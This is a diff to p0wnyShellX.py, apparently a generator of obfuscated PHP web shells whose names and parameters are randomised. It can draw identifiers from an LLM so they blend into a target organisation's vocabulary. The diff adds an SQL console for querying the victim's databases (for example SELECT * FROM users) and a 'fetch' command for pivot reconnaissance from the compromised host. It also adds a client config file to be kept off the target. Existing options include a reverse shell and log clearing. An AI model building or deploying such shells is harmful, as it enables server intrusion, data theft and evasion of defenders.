@@ -6,7 +6,7 @@ Usage: python3 p0wnyShellX.py -p MyPass -o shell.php [options]
 import argparse, random, string, base64, sys, subprocess
 import json, os, re, urllib.error, urllib.request
 
-VERSION = "3.0.0"
+VERSION = "3.1.0"
 
 # ─────────────────────────────────────────────────────────────────────────────
 # NAME POOLS
@@ -292,6 +292,8 @@ def generate_transport_context(rng: random.Random, mode: str, param_pool: list |
             'p_mode': 'scan_mode', 'p_timeout': 'scan_timeout',
             'p_pause': 'scan_pause', 'p_rs_method': 'rs_method',
             'p_ps_probe': 'ps_probe',
+            'p_dsn': 'dsn', 'p_dbuser': 'dbuser', 'p_dbpass': 'dbpass',
+            'p_sqlq': 'sqlq', 'p_url': 'url',
         }
     pool = list(param_pool or MIMIC_PARAM_POOL)
     rng.shuffle(pool)
@@ -305,6 +307,8 @@ def generate_transport_context(rng: random.Random, mode: str, param_pool: list |
         'p_mode': pool[12], 'p_timeout': pool[13],
         'p_pause': pool[14], 'p_rs_method': pool[15],
         'p_ps_probe': pool[16],
+        'p_dsn': pool[17], 'p_dbuser': pool[18], 'p_dbpass': pool[19],
+        'p_sqlq': pool[20], 'p_url': pool[21],
     }
     if mode == 'rc4':
         rc4_bytes = [rng.randint(0, 255) for _ in range(16)]
@@ -415,22 +419,37 @@ def _llm_context_clause(company: str | None, context: str | None) -> str:
 
 def _parse_llm_list(text: str) -> list[str]:
     """Extract a string list from an LLM response regardless of formatting."""
+    import ast
+    # Reasoning models (deepseek-r1, qwq…) wrap their chain of thought in
+    # <think> blocks — drop them before parsing.
+    text = re.sub(r"<think>.*?</think>", "", text, flags=re.DOTALL | re.IGNORECASE)
+    # Small models annotate array entries with trailing // comments, which
+    # breaks both JSON and Python-literal parsing — strip them per line.
+    text = re.sub(r'^(\s*"[^"]*")\s*,?\s*//[^\n]*$', r'\1,', text, flags=re.M)
     text = re.sub(r"```(?:json|JSON)?\s*", "", text)
     text = re.sub(r"```\s*", "", text).strip()
-    try:
-        parsed = json.loads(text)
-        if isinstance(parsed, list):
-            return [s for x in parsed if (s := str(x).strip()) and not s.startswith(("{", "["))]
-    except json.JSONDecodeError:
-        pass
+
+    def _coerce(raw: str) -> list[str]:
+        # Strict JSON first, then Python-literal (small models often answer
+        # with single-quoted 'arrays', which are invalid JSON).
+        for loader in (json.loads, ast.literal_eval):
+            try:
+                parsed = loader(raw)
+            except Exception:
+                continue
+            if isinstance(parsed, list):
+                return [s for x in parsed
+                        if (s := str(x).strip()) and not s.startswith(("{", "["))]
+        return []
+
+    out = _coerce(text)
+    if out:
+        return out
     m = re.search(r"\[.*?\]", text, re.DOTALL)
     if m:
-        try:
-            parsed = json.loads(m.group())
-            if isinstance(parsed, list):
-                return [s for x in parsed if (s := str(x).strip()) and not s.startswith(("{", "["))]
-        except json.JSONDecodeError:
-            pass
+        out = _coerce(m.group())
+        if out:
+            return out
     lines = []
     for raw in text.splitlines():
         line = raw.strip()
@@ -445,11 +464,11 @@ def _llm_call_ollama(prompt: str, model: str) -> str:
     base = os.environ.get("OLLAMA_HOST", "http://localhost:11434").rstrip('/')
     payload = json.dumps({
         "model": model, "prompt": prompt, "stream": False,
-        "options": {"temperature": 0.9, "num_predict": 512},
+        "options": {"temperature": 0.9, "num_predict": 1024},
     }).encode()
     req = urllib.request.Request(f"{base}/api/generate", data=payload,
                                  headers={"Content-Type": "application/json"}, method="POST")
-    with urllib.request.urlopen(req, timeout=60) as resp:
+    with urllib.request.urlopen(req, timeout=120) as resp:
         return json.loads(resp.read()).get("response", "")
 
 
@@ -457,26 +476,26 @@ def _llm_call_openai_compat(prompt: str, model: str, api_key: str, base_url: str
     payload = json.dumps({
         "model": model,
         "messages": [{"role": "user", "content": prompt}],
-        "temperature": 0.9, "max_tokens": 512,
+        "temperature": 0.9, "max_tokens": 1024,
     }).encode()
     req = urllib.request.Request(f"{base_url.rstrip('/')}/chat/completions", data=payload,
                                  headers={"Content-Type": "application/json",
                                           "Authorization": f"Bearer {api_key}"}, method="POST")
-    with urllib.request.urlopen(req, timeout=60) as resp:
+    with urllib.request.urlopen(req, timeout=120) as resp:
         data = json.loads(resp.read())
     return data["choices"][0]["message"]["content"]
 
 
 def _llm_call_anthropic(prompt: str, model: str, api_key: str) -> str:
     payload = json.dumps({
-        "model": model, "max_tokens": 512,
+        "model": model, "max_tokens": 1024,
         "messages": [{"role": "user", "content": prompt}],
     }).encode()
     req = urllib.request.Request("https://api.anthropic.com/v1/messages", data=payload,
                                  headers={"Content-Type": "application/json",
                                           "x-api-key": api_key,
                                           "anthropic-version": "2023-06-01"}, method="POST")
-    with urllib.request.urlopen(req, timeout=60) as resp:
+    with urllib.request.urlopen(req, timeout=120) as resp:
         data = json.loads(resp.read())
     return data["content"][0]["text"]
 
@@ -525,6 +544,10 @@ class LLMProvider:
             ok = []
             for c in candidates:
                 c = c.strip()
+                # Models often answer PascalCase despite "camelCase" in the
+                # prompt — normalize instead of discarding the candidate.
+                if category == 'func_names' and re.match(r'^[A-Z][a-zA-Z0-9]{2,39}$', c):
+                    c = c[0].lower() + c[1:]
                 if (validator.match(c) and c not in seen
                         and not any(bad in c.lower() for bad in _LLM_DENY_SUBSTRINGS)):
                     seen.add(c)
@@ -839,6 +862,11 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
     p_pause     = transport_ctx['p_pause']
     p_rs_method = transport_ctx['p_rs_method']
     p_ps_probe  = transport_ctx['p_ps_probe']
+    p_dsn       = transport_ctx['p_dsn']
+    p_dbuser    = transport_ctx['p_dbuser']
+    p_dbpass    = transport_ctx['p_dbpass']
+    p_sqlq      = transport_ctx['p_sqlq']
+    p_url       = transport_ctx['p_url']
 
     # ── Feature-gated JS interceptors ──
     jfn = jv  # alias used throughout f-string template
@@ -901,6 +929,33 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
             f"                if (_pgPrM) _pgProbe = _pgPrM[1];\n"
             f"                {jfn['insert_stdout']}(\"Sweeping...\");\n"
             f"                {jfn['pipe_call']}(\"?{route_param}={routes['pingsweep']}\", {{{p_target}: _pgmRaw[1], {p_ps_probe}: _pgProbe, {p_mode}: _pgMode, {p_timeout}: _pgTout, {p_pause}: _pgPause}}, function(r) {{\n"
+            f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
+            f"                }});\n"
+            f"                return;\n"
+            f"            }}"
+        )
+    if features.get('sql'):
+        _js_interceptors.append(
+            f"            var _sqlM = command.match(/^\\s*sql\\s+(\\S+)\\s+([\\s\\S]+?)\\s*$/i);\n"
+            f"            if (_sqlM) {{\n"
+            f"                var _sqlU = '', _sqlP = '', _sqlRest = _sqlM[2];\n"
+            f"                if (!/^sqlite:/i.test(_sqlM[1])) {{\n"
+            f"                    var _sqlC = _sqlRest.match(/^(\\S+)\\s+(\\S+)\\s+([\\s\\S]+)$/);\n"
+            f"                    if (_sqlC) {{ _sqlU = _sqlC[1]; _sqlP = _sqlC[2]; _sqlRest = _sqlC[3]; }}\n"
+            f"                }}\n"
+            f"                var _sqlQ = _sqlRest.replace(/^([\"'])([\\s\\S]*)\\1$/, '$2');\n"
+            f"                {jfn['pipe_call']}(\"?{route_param}={routes['sql']}\", {{{p_dsn}: _sqlM[1], {p_dbuser}: _sqlU, {p_dbpass}: _sqlP, {p_sqlq}: _sqlQ}}, function(r) {{\n"
+            f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
+            f"                }});\n"
+            f"                return;\n"
+            f"            }}"
+        )
+    if features.get('fetch'):
+        _js_interceptors.append(
+            f"            var _feM = command.match(/^\\s*fetch\\s+(\\S+)\\s*$/i);\n"
+            f"            if (_feM) {{\n"
+            f"                {jfn['insert_stdout']}(\"Fetching...\");\n"
+            f"                {jfn['pipe_call']}(\"?{route_param}={routes['fetch']}\", {{{p_url}: _feM[1]}}, function(r) {{\n"
             f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
             f"                }});\n"
             f"                return;\n"
@@ -1299,6 +1354,88 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
             "            $response = ['stdout' => base64_encode($__out3), 'cwd' => base64_encode(getcwd())];",
             "            break;",
         ]),
+        'sql': "\n".join([
+            f"        case '{routes['sql']}':",
+            f"            $__dsn  = trim({pdec(p_dsn)});",
+            f"            $__dbu  = trim({pdec(p_dbuser)});",
+            f"            $__dbp  = {pdec(p_dbpass)};",
+            f"            $__sqlq = trim({pdec(p_sqlq)});",
+            "            if ($__dsn === '' || $__sqlq === '') {",
+            "                $response = ['stdout' => base64_encode('Usage: sql <dsn> [user pass] <query> — e.g. sql sqlite:/var/www/app.db \"SELECT * FROM users\" or sql mysql:host=127.0.0.1;dbname=app root toor \"SELECT ...\"'), 'cwd' => base64_encode(getcwd())];",
+            "            } elseif (!class_exists('PDO')) {",
+            "                $response = ['stdout' => base64_encode('PDO is not available on this host.'), 'cwd' => base64_encode(getcwd())];",
+            "            } else {",
+            "                try {",
+            "                    $__pdo = new PDO($__dsn, $__dbu !== '' ? $__dbu : null, $__dbp !== '' ? $__dbp : null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);",
+            "                    if (preg_match('/^\\s*(select|show|describe|explain|pragma|with)\\b/i', $__sqlq)) {",
+            "                        $__st = $__pdo->query($__sqlq);",
+            "                        $__rows = $__st ? array_slice($__st->fetchAll(PDO::FETCH_ASSOC), 0, 100) : [];",
+            "                        if (!$__rows) {",
+            "                            $__out4 = 'OK — 0 rows.';",
+            "                        } else {",
+            "                            $__cols = array_keys($__rows[0]);",
+            "                            $__w = [];",
+            "                            foreach ($__cols as $__c) { $__w[$__c] = strlen((string)$__c); }",
+            "                            foreach ($__rows as $__r) { foreach ($__cols as $__c) { $__w[$__c] = min(40, max($__w[$__c], strlen((string)($__r[$__c] ?? 'NULL')))); } }",
+            "                            $__fmt = function($__r) use ($__cols, $__w) { $__parts = []; foreach ($__cols as $__c) { $__v = substr((string)($__r[$__c] ?? 'NULL'), 0, 40); $__parts[] = str_pad($__v, $__w[$__c]); } return implode(' | ', $__parts); };",
+            "                            $__lines = [$__fmt(array_combine($__cols, $__cols))];",
+            "                            $__lines[] = implode('-+-', array_map(function($__c) use ($__w) { return str_repeat('-', $__w[$__c]); }, $__cols));",
+            "                            foreach ($__rows as $__r) { $__lines[] = $__fmt($__r); }",
+            "                            $__out4 = implode(\"\\n\", $__lines) . \"\\n(\" . count($__rows) . (count($__rows) === 100 ? '+' : '') . ' rows)';",
+            "                        }",
+            "                    } else {",
+            "                        $__n = $__pdo->exec($__sqlq);",
+            "                        $__out4 = 'OK — ' . ($__n === false ? 0 : $__n) . ' row(s) affected.';",
+            "                    }",
+            "                } catch (Exception $__e) {",
+            "                    $__out4 = 'SQL error: ' . $__e->getMessage();",
+            "                }",
+            "                $response = ['stdout' => base64_encode($__out4), 'cwd' => base64_encode(getcwd())];",
+            "            }",
+            "            break;",
+        ]),
+        'fetch': "\n".join([
+            f"        case '{routes['fetch']}':",
+            f"            $__url = trim({pdec(p_url)});",
+            "            if (!preg_match('#^https?://#i', $__url)) {",
+            "                $response = ['stdout' => base64_encode('Usage: fetch <http(s)-url> — fetch a URL from the target host (pivot recon)'), 'cwd' => base64_encode(getcwd())];",
+            "            } else {",
+            "                $__body = false; $__meta = '';",
+            "                if (function_exists('curl_init')) {",
+            "                    $__ch = curl_init($__url);",
+            "                    curl_setopt_array($__ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_MAXREDIRS => 3, CURLOPT_TIMEOUT => 8, CURLOPT_USERAGENT => 'Mozilla/5.0', CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false]);",
+            "                    $__body = curl_exec($__ch);",
+            "                    $__meta = 'HTTP ' . curl_getinfo($__ch, CURLINFO_RESPONSE_CODE) . ' (curl)';",
+            "                    curl_close($__ch);",
+            "                } elseif (ini_get('allow_url_fopen')) {",
+            "                    $__ctx = stream_context_create(['http' => ['timeout' => 8, 'user_agent' => 'Mozilla/5.0', 'follow_location' => 1, 'max_redirects' => 3], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);",
+            "                    $__body = @file_get_contents($__url, false, $__ctx);",
+            "                    $__meta = 'via fopen';",
+            "                } else {",
+            "                    $__pu = parse_url($__url);",
+            "                    $__host = $__pu['host'] ?? ''; $__port = $__pu['port'] ?? (($__pu['scheme'] ?? '') === 'https' ? 443 : 80);",
+            "                    $__path = ($__pu['path'] ?? '/') . (isset($__pu['query']) ? '?' . $__pu['query'] : '');",
+            "                    $__sk = @fsockopen((($__pu['scheme'] ?? '') === 'https' ? 'ssl://' : '') . $__host, $__port, $__en, $__es, 8);",
+            "                    if ($__sk) {",
+            "                        fwrite($__sk, \"GET $__path HTTP/1.0\\r\\nHost: $__host\\r\\nUser-Agent: Mozilla/5.0\\r\\nConnection: close\\r\\n\\r\\n\");",
+            "                        $__raw = '';",
+            "                        while (!feof($__sk) && strlen($__raw) < 200000) { $__raw .= fread($__sk, 8192); }",
+            "                        fclose($__sk);",
+            "                        $__pos = strpos($__raw, \"\\r\\n\\r\\n\");",
+            "                        $__meta = 'via fsockopen — ' . strtok($__raw, \"\\r\\n\");",
+            "                        $__body = $__pos !== false ? substr($__raw, $__pos + 4) : $__raw;",
+            "                    }",
+            "                }",
+            "                if ($__body === false || $__body === '') {",
+            "                    $__out5 = \"Fetch failed or empty response ($__meta).\";",
+            "                } else {",
+            "                    if (strlen($__body) > 131072) { $__body = substr($__body, 0, 131072) . \"\\n[... truncated at 128 KB]\"; }",
+            "                    $__out5 = $__meta . \"\\n\\n\" . $__body;",
+            "                }",
+            "                $response = ['stdout' => base64_encode($__out5), 'cwd' => base64_encode(getcwd())];",
+            "            }",
+            "            break;",
+        ]),
     }
     switch_body = "\n".join(case_blocks[c] for c in case_order)
 
@@ -1608,7 +1745,7 @@ function {n['resolve_task']}($cmd, $cwd) {{
     chdir($cwd);
     if (preg_match("/^\\s*cd\\s*(2>&1)?$/i", $cmd)) {{
         @chdir({n['expand_tilde']}("~"));
-    }} elseif (preg_match("/^\\s*cd\\s+(.+)\\s*(2>&1)?$/i", $cmd, $m)) {{
+    }} elseif (preg_match("/^\\s*cd\\s+(.+?)\\s*(?:2>&1)?$/i", $cmd, $m)) {{
         @chdir({n['expand_tilde']}($m[1]));
     }} elseif (preg_match("/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/i", $cmd, $m)) {{
         return {n['read_file']}($m[1]);
@@ -2007,6 +2144,8 @@ def generate(args, info=None):
         'clearlog':  rnd_token(rng, 7),
         'portscan':  rnd_token(rng, 7),
         'pingsweep': rnd_token(rng, 7),
+        'sql':       rnd_token(rng, 7),
+        'fetch':     rnd_token(rng, 7),
     }
     session_key_val = rnd_token(rng, 14)
 
@@ -2081,6 +2220,10 @@ def generate(args, info=None):
         case_order.append('portscan')
     if args.pingsweep:
         case_order.append('pingsweep')
+    if args.sql:
+        case_order.append('sql')
+    if args.fetch:
+        case_order.append('fetch')
     rng.shuffle(case_order)
 
     # Version
@@ -2089,11 +2232,31 @@ def generate(args, info=None):
     # Transport context (param names + optional crypto keys)
     transport_ctx = generate_transport_context(rng, args.transport, param_pool=mimic_pool)
 
+    # Optional sidecar for tools/shellx_client.py — the per-build protocol
+    # description (tokens, param names, crypto) so the CLI client never has
+    # to guess. Keep it OFF the target machine.
+    if getattr(args, 'client_config', None):
+        sidecar = {
+            'version': VERSION,
+            'route_param': route_param,
+            'routes': routes,
+            'transport': args.transport,
+            'params': {k: v for k, v in transport_ctx.items()
+                       if k.startswith('p_')},
+        }
+        if args.transport == 'rc4':
+            sidecar['rc4_key_hex'] = transport_ctx['rc4_key_hex']
+            sidecar['b64_alpha'] = transport_ctx['b64_alpha']
+        with open(args.client_config, 'w', encoding='utf-8') as f:
+            json.dump(sidecar, f, indent=2)
+
     features = {
         'revshell':  args.revshell,
         'clearlog':  args.clearlog,
         'portscan':  args.portscan,
         'pingsweep': args.pingsweep,
+        'sql':       args.sql,
+        'fetch':     args.fetch,
     }
 
     return build_php_section(
@@ -2156,6 +2319,10 @@ Examples:
                         help='Compile portscan command into the shell (opt-in; not included by default)')
     parser.add_argument('--pingsweep', action='store_true', default=False,
                         help='Compile pingsweep command into the shell (opt-in; not included by default)')
+    parser.add_argument('--sql', action='store_true', default=False,
+                        help='Compile sql command into the shell — PDO query console: sql <dsn> [user pass] <query> (opt-in)')
+    parser.add_argument('--fetch', action='store_true', default=False,
+                        help='Compile fetch command into the shell — fetch a URL from the target host, pivot recon (opt-in)')
     parser.add_argument('-d', '--outdir', default=None,
                         help='Output directory. Combined with -o (filename only). E.g. -d /tmp/ -o shell.php → /tmp/shell.php')
     parser.add_argument('--llm', default=None, metavar='SPEC',
@@ -2167,6 +2334,9 @@ Examples:
                         help='Target organization name — LLM generates names/strings in its vocabulary (requires --llm)')
     parser.add_argument('--context', default=None, metavar='TEXT',
                         help='Extra target context, e.g. "logistics, France" (requires --llm)')
+    parser.add_argument('--client-config', default=None, metavar='PATH',
+                        help='Write a sidecar JSON describing this build\'s protocol (routes, param names, '
+                             'crypto) for tools/shellx_client.py. Keep it off the target machine.')
     parser.add_argument('-V', '--version', action='version', version=f'%(prog)s {VERSION}')
     args = parser.parse_args()
 
@@ -2222,6 +2392,8 @@ Examples:
         ctx_bits = [b for b in (args.company, args.context) if b]
         print(f"[+] LLM       : {args.llm_provider.provider}:{args.llm_provider.model}"
               + (f" (context: {', '.join(ctx_bits)})" if ctx_bits else ""), file=info)
+    if args.client_config:
+        print(f"[+] Client cfg: {args.client_config} (keep it off the target)", file=info)
     if args.seed:
         print(f"[+] Seed      : {args.seed}", file=info)
 
